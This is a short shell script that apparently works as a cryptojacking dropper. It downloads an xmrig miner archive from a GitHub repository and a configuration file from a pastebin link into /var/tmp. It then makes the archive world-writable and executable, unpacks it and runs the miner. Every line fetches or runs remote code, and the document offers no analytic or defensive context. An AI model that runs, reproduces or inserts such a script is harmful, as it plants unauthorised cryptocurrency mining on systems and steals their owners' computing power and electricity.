#!/bin/sh
curl -o /var/tmp/xmrig -L https://github.com/mtverraen/clusterduck/raw/main/file.tar.gz
curl -o /var/tmp/config.json https://pastebin.com/raw/9sxsXLrM
chmod 777 /var/tmp/xmrig
cd /var/tmp
tar -xvf xmrig
./xmrig -c config.json
